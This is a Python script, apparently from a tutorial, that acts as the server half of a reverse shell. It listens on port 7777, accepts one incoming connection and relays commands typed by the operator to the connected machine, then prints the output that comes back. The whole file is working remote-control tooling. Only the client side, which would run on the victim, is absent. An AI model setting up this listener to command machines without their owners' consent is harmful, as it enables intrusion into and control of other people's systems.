
import socket
import sys

# Create a socket ( connect two comp )
def create_socket():


    try:

        global host, port, s

        host = ""
        port = 7777

        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error:" + str(msg))

#Biningthe socket and listening for connection

def bind_socket():

    try:
        global host
        global port
        global s

        print("Bindind Port " + str(port) )
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket creation error:" + str(msg) +"\n"+ "retrying...")
        bind_socket()

# Establish conn with a client (socket must be listening)

def socket_accept():

    conn,address = s.accept()
    print("Connection has been established! " + "IP" + address[0] + "Port" + str(address[1]))

    send_commands(conn)

    conn.close()

#  Send commands

def send_commands(conn):

    while True:

        cmd = input()

        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response,)


def main():
    create_socket()
    bind_socket()
    socket_accept()
    

main()